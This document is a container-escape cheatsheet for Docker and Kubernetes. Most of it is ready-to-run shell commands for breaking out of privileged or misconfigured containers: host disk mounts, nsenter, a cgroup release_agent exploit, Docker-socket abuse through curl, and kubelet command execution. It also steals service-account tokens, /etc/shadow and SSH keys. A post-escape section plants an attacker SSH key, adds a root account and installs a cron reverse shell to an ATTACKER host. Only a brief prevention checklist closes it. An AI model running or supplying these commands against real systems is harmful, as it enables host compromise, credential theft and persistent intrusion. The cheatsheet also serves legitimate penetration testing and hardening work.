# Docker Escape Cheatsheet

## Detection: Am I in a Container?
```bash
# Check for .dockerenv file
ls -la /.dockerenv

# Check cgroup
cat /proc/1/cgroup | grep docker
cat /proc/1/cgroup | grep kubepods

# Check hostname (often random hex in containers)
hostname

# Check for limited processes (PID 1 is often not init/systemd)
ps aux
cat /proc/1/cmdline

# Check mount info
cat /proc/self/mountinfo | grep docker

# Check environment
env | grep -i kube
env | grep -i docker

# Limited capabilities
capsh --print 2>/dev/null

# Check for container runtime socket
ls -la /var/run/docker.sock
ls -la /run/containerd/containerd.sock
```

## Privileged Container Escape
```bash
# Check if privileged
cat /proc/self/status | grep CapEff
# CapEff: 000001ffffffffff = fully privileged

# Method 1: Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host
# Now access host filesystem at /mnt/host
cat /mnt/host/etc/shadow
chroot /mnt/host bash

# Method 2: nsenter to host PID namespace
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# Method 3: Access host via /dev
# Find host disk
fdisk -l
# Mount it
mount /dev/sda1 /mnt

# Method 4: cgroup escape (CVE-2022-0492)
# Create cgroup with release_agent
mkdir /tmp/escape
mount -t cgroup -o rdma cgroup /tmp/escape
mkdir /tmp/escape/x
echo 1 > /tmp/escape/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/escape/release_agent
echo '#!/bin/sh' > /cmd
echo 'id > /output' >> /cmd
chmod +x /cmd
echo $$ > /tmp/escape/x/cgroup.procs
# Check /output on host (or in container if overlay matches)
```

## Docker Socket Mount (/var/run/docker.sock)
```bash
# Check if Docker socket is mounted
ls -la /var/run/docker.sock

# If docker CLI is available
docker ps
docker images

# Create privileged container with host mount
docker run -it --privileged --pid=host -v /:/mnt/host alpine chroot /mnt/host bash

# If docker CLI is not available, use curl
# List containers
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool

# List images
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | python3 -m json.tool

# Create and start a privileged container
curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host"}],"HostConfig":{"Privileged":true}}' \
  http://localhost/containers/create

# Start the container (use ID from create response)
curl -s --unix-socket /var/run/docker.sock -X POST \
  http://localhost/containers/CONTAINER_ID/start

# Execute command in container
curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"Cmd":["cat","/host/etc/shadow"],"Tty":true}' \
  http://localhost/containers/CONTAINER_ID/exec
```

## Capability-Based Escapes
```bash
# Check capabilities
capsh --print
cat /proc/self/status | grep Cap
# Decode: capsh --decode=<hex_value>

# CAP_SYS_ADMIN: mount host filesystems
mount /dev/sda1 /mnt
# Also enables cgroup escape (above)

# CAP_SYS_PTRACE: inject into host processes
# Find a host process (PID namespace must be shared)
nsenter --target <HOST_PID> --mount --uts --ipc --net --pid -- /bin/bash

# Or inject shellcode into a host process
# Use a tool or write to /proc/<pid>/mem

# CAP_DAC_READ_SEARCH: read any file on host (if host PID ns)
# Use open_by_handle_at() syscall to access host filesystem
# Tool: shocker exploit (https://github.com/gabber12/shocker)

# CAP_NET_ADMIN: manipulate host network
ip link
iptables -L
# ARP spoofing, traffic interception

# CAP_NET_RAW: raw socket access
# Packet sniffing on host network
tcpdump -i eth0

# CAP_SYS_MODULE: load kernel modules
# Compile and load a malicious kernel module for host access
insmod evil.ko
```

## Sensitive Mount Escapes
```bash
# /proc/sysrq-trigger (if mounted writable)
echo b > /proc/sysrq-trigger  # Reboot host (DoS, not escape, but confirms access)

# /proc/sys writable
echo 1 > /proc/sys/kernel/core_pattern  # Can set to write core dumps to host paths

# Host /etc mounted
# Modify /etc/crontab, /etc/passwd, etc.

# Host /var/log mounted
# Log injection for log poisoning attacks

# /dev mounted
# Access raw block devices
cat /dev/sda1 | strings | grep password
```

## Kernel Exploits from Container
```bash
# Check kernel version
uname -r

# DirtyPipe (CVE-2022-0847) - Linux 5.8+
# Works from inside containers to overwrite host files

# DirtyCow (CVE-2016-5195) - Linux 2.6.22 to 4.8.3
# Can overwrite host files from container

# runc escape (CVE-2019-5736)
# Overwrite host runc binary via /proc/self/exe
# Requires exec into container (attacker waits for admin to docker exec)

# OverlayFS exploits (CVE-2023-0386)
# Ubuntu-specific OverlayFS privilege escalation
```

## Container Breakout via Misconfigurations
```bash
# Host PID namespace (--pid=host)
# Can see and interact with host processes
ps aux  # Shows host processes
nsenter --target 1 --mount -- /bin/bash

# Host network namespace (--net=host)
# Can access host network services on localhost
curl http://127.0.0.1:8080  # Access host services

# Host IPC namespace (--ipc=host)
# Can access host shared memory
ipcs -a

# Host UTS namespace (--uts=host)
# Can change host hostname
hostname malicious-name

# Excessive environment variables
env | grep -i password
env | grep -i secret
env | grep -i key
env | grep -i token

# Mounted secrets
find / -name "*.key" -o -name "*.pem" -o -name "*.cert" 2>/dev/null
cat /run/secrets/*
ls -la /var/run/secrets/kubernetes.io/serviceaccount/
```

## Kubernetes-Specific
```bash
# Check for Kubernetes service account
ls -la /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Access Kubernetes API
APISERVER=https://kubernetes.default.svc
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Check permissions
curl -s --cacert $CACERT --header "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/pods

# List secrets
curl -s --cacert $CACERT --header "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/secrets

# Create privileged pod (if permitted)
# Write pod spec YAML that mounts host filesystem
# kubectl apply -f malicious-pod.yaml

# Check for kubelet API (port 10250)
curl -sk https://NODE_IP:10250/pods
curl -sk https://NODE_IP:10250/run/<namespace>/<pod>/<container> -d "cmd=id"
```

## Post-Escape Actions
```bash
# Once on host, establish persistence
# Add SSH key
echo "ssh-rsa AAAA... attacker@host" >> /mnt/host/root/.ssh/authorized_keys

# Add user
echo 'hacker:$1$salt$hash:0:0::/root:/bin/bash' >> /mnt/host/etc/passwd

# Cron job
echo '* * * * * root bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /mnt/host/etc/crontab

# Read sensitive data
cat /mnt/host/etc/shadow
cat /mnt/host/root/.ssh/id_rsa
find /mnt/host -name "*.env" -exec cat {} \;
```

## Prevention Checklist
```
- Never run containers with --privileged
- Never mount Docker socket into containers
- Use read-only root filesystem (--read-only)
- Drop all capabilities, add only needed ones (--cap-drop=ALL --cap-add=NET_BIND_SERVICE)
- Use non-root user in container (USER directive in Dockerfile)
- Enable seccomp profiles (default Docker profile blocks dangerous syscalls)
- Enable AppArmor/SELinux profiles
- Use separate PID/network/IPC namespaces (default)
- Limit resources (--memory, --cpus)
- Keep Docker and kernel updated
- Use minimal base images (distroless, scratch, alpine)
- Scan images for vulnerabilities (Trivy, Grype)
```
